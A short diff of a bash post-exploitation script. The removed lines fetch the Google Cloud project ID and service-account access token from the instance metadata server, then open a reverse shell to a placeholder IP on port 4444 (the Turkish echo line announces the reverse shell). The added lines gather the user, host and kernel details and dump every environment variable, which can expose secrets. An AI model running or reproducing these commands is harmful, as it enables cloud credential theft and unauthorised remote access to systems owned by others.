@@ -1,14 +1,10 @@
 #!/bin/bash
 
-echo "[+] User and Host:"
+echo "=== USER & HOST ==="
 whoami
 hostname
+uname -a
 
-echo "[+] Project ID:"
-curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/project-id
+echo "=== ENVIRONMENT VARIABLES ==="
+printenv
 
-echo "[+] Token:"
-curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
-
-echo "[+] Reverse shell başlatılıyor..."
-bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
